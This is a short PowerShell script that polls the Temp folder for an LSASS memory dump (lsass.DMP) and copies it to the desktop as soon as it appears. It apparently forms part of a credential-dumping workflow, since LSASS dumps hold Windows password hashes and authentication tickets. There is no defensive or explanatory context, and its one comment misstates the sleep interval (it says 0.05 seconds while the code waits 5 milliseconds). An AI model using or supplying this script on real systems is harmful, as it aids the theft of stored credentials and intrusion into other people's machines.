while ($true) {
    $sourcePath = "$env:LOCALAPPDATA\Temp\lsass.DMP"
    $destinationPath = "$env:USERPROFILE\Desktop\dumpedd_sass.DMP"
    
    # Check if lsass.DMP exists in the source path
    if (Test-Path $sourcePath) {
        # Copy lsass.DMP to destination path
        Copy-Item -Path $sourcePath -Destination $destinationPath -Force
        Write-Host "lsass.DMP copied to desktop"
        
        # Exit the loop once copied
        break
    } else {
        Write-Host "lsass.DMP not found in Temp directory"
    }
    
    # Pause for 0.05 seconds
    Start-Sleep -Milliseconds 5
}

